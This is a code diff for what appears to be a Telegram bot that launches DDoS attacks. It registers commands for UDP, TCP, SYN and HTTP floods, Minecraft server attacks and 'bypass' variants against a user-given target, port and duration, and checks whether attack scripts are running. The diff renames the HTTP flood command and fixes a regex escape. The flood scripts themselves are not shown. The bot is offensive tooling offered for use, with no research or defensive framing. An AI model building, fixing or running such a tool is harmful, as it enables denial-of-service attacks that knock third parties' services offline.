@@ -26,7 +26,7 @@ ATTACK_SCRIPTS = {
     'udp': ('attacks/udp.py', 500),
     'tcp': ('attacks/tcp.py', 300),
     'syn': ('attacks/syn.py', 300),
-    'http': ('attacks/http.py', 200),
+    'httpflood': ('attacks/httpflood.py', 200),
     'tudp': ('attacks/tudp.py', 1500),
     'mc': ('attacks/mc.py', 1000),
     'mcquery': ('attacks/mcquery.py', 800),
@@ -103,7 +103,7 @@ def start_command(message):
 /udp <target> <port> <time> - UDP Flood
 /tcp <target> <port> <time> - TCP Flood
 /syn <target> <port> <time> - SYN Flood
-/http <target> <port> <time> - HTTP Flood
+/httpflood <target> <port> <time> - HTTP Flood
 /tudp <target> <port> <time> - TUDP Monster
 /mc <target> <port> <time> - Minecraft Attack
 /mcquery <target> <port> <time> - Minecraft Query
@@ -127,7 +127,7 @@ def help_command(message):
 /udp 1.2.3.4 80 60
 /tcp 1.2.3.4 80 60
 /syn 1.2.3.4 80 60
-/http 1.2.3.4 80 60
+/httpflood 1.2.3.4 80 60
 /tudp 1.2.3.4 80 60
 /mc 1.2.3.4 25565 60
 /mcquery 1.2.3.4 25565 60
@@ -173,7 +173,7 @@ def check_command(message):
         bot.reply_to(message, "❌ Not authorized")
         return
     
-    result = subprocess.getoutput("ps aux | grep -E 'python3.*attacks/.*\.py' | grep -v grep")
+    result = subprocess.getoutput("ps aux | grep -E 'python3.*attacks/.*\\.py' | grep -v grep")
     if result:
         response = f"🟢 ATTACK RUNNING!\n\n{result[:300]}"
     else:
@@ -276,7 +276,7 @@ def make_handler(attack_type):
     return handler
 
 # Register all attacks
-attacks = ['udp', 'tcp', 'syn', 'http', 'tudp', 'mc', 'mcquery', 'mchandshake', 'udpbypass', 'tcpbypass', 'gudp']
+attacks = ['udp', 'tcp', 'syn', 'httpflood', 'tudp', 'mc', 'mcquery', 'mchandshake', 'udpbypass', 'tcpbypass', 'gudp']
 for attack in attacks:
     handler = make_handler(attack)
     handler.__name__ = f"handle_{attack}"
